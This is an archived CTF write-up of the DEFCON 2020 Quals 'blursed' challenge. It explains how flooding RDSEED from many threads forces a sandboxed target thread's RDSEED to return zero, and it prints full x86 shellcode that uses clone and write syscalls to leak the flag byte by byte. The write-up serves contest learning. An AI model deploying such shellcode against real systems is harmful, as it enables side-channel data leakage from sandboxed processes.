# blursed

**CTF:** DEFCON 2020 Quals  
**Category:** misc  
**Original writeup:** <https://mem2019.github.io/jekyll/update/2020/05/22/Defcon-Cursed-Blursed.html> — by **mem2019**. All credit goes to the original author; this is an archived copy.

---

0x04 Blursed

The logic of bozo.bin is almost identical, except the bug in cursed is fixed by using r15 to save return address, and except number of times that 0xffffffff is written after each flag byte processing increases from 8 to 64. Therefore, we need to go back to the idea to make rdseed return 0.

Thanks to my teammate @ShadowNight who found this:

Unlike the RDRAND instruction, the seed values come directly from the entropy conditioner, and it is possible for callers to invoke RDSEED faster than those values are generated. This means that applications must be designed robustly and be prepared for calls to RDSEED to fail because seeds are not available (CF=0). If only one thread is calling RDSEED infrequently, it is very unlikely that a random seed will not be available. Only during periods of heavy demand, such as when one thread is calling RDSEED in rapid succession or multiple threads are calling RDSEED simultaneously, are underflows likely to occur.

When rdseed fails, the destination register will be set as zero, so it will not write to our critical shellcode.

IF HW_NRND_GEN . ready = 1 THEN CASE of osize is 64 : DEST [ 63 : 0 ] ← HW_NRND_GEN . data ; osize is 32 : DEST [ 31 : 0 ] ← HW_NRND_GEN . data ; osize is 16 : DEST [ 15 : 0 ] ← HW_NRND_GEN . data ; ESAC ; CF ← 1 ; ELSE CASE of osize is 64 : DEST [ 63 : 0 ] ← 0 ; osize is 32 : DEST [ 31 : 0 ] ← 0 ; osize is 16 : DEST [ 15 : 0 ] ← 0 ; ESAC ; CF ← 0 ; FI ; OF , SF , ZF , AF , PF ← 0 ; // https://www.felixcloutier.com/x86/rdseed

As the reference suggests, if there are multiple threads that calls rdseed very frequently, the rdseed is very likely to gives zero. Thus, noting that clone is allowed in seccomp sandbox, the idea comes up: creating multiple threads calling rdseed in a infinite loop to let rdseed of bozo.bin thread give zero.

Pseudo Code

In previous section I have mentioned an idea to leak the flag byte one by one, and here is the pseudo code describing that approach:

while True : for i in [ 1. .. 255 ] # iterate from 1-255 [ rbx ] = i # set +0xff8 to i wait # wait for some while, # to make sure this value is checked by bozo.bin thread if [ rbx ] == 0 : # if +0xff8 is set to 0, current value is correct print i # print the byte value break # try the next byte

Shellcode

Adding the code that initiates threads that frequently call rdseed , we can write our shellcode as shown below:

call next next: pop rbx mov rbp, %s ; parameterize number of threads clones: mov rdi,0x18900 ; use the same flag as that of bozo.bin thread mov rsi,rsp sub rsi,0x2000 ; stack is rsp-0x2000, although not used mov rax,SYS_clone syscall ; call clone test rax, rax jz rdseed_loop ; let child thread execute the rdseed loop dec rbp test rbp,rbp jnz clones add rbx, -5+0xff8 ; rbx = RWX+0xff8 mov rsi, rbx sub rsi, 8 ; rsi = buffer for SYS_write mov rax, SYS_write mov rdi, 1 ; fd = stdout mov rdx, 1 ; size = 1 ; load the needed arguement into register first ; to reduce size of the loop ; therefore the crack_loop is less likely to be destructed mov rcx,0x100 wait0: loop wait0 ; wait for a while to ensure threads are started ; maybe it is not needed crack_loop: mov r8,1 ; i = 1 byte_loop: mov qword ptr [rbx], r8 ; [rbx] = i mov rcx,%s wait: loop wait ; wait ; the rcx, number of times, is parameterized cmp qword ptr [rbx], 0 jnz byte_loop_end ; if [rbx] == 0 mov [rsi], r8 syscall ; print i jmp crack_loop ; break, try next byte byte_loop_end: inc r8 ; if [rbx] != 0, increment i and try next value cmp r8, 0xff jbe byte_loop jmp crack_loop rdseed_loop: rdseed rax jmp rdseed_loop

One thing to note is that calling convention of SYS_clone is different from clone function used in program: SYS_clone takes flag as first argument and stack as second argument, and it works like fork (child process/thread returns 0 while parent process/thread returns a positive pid ).

However, this shellcode does not work very well on my local PC, it can leak some bytes, but it cannot leak whole flag. The reason is that rdseed still returns non-zero for many case. Since there is a PoW on remote machine, I was thinking that I should not brute force and that there should be a better approach to let rdseed return zero more stably. I tried to find some ways such as giving more priority to threads that I created, but I failed to have any progress. Finally, I still decided to try brute force. Thanks to @半神道人, who wrote the PoW and ran it on a super-fast cloud server, we can obtain the PoW data in a split second.
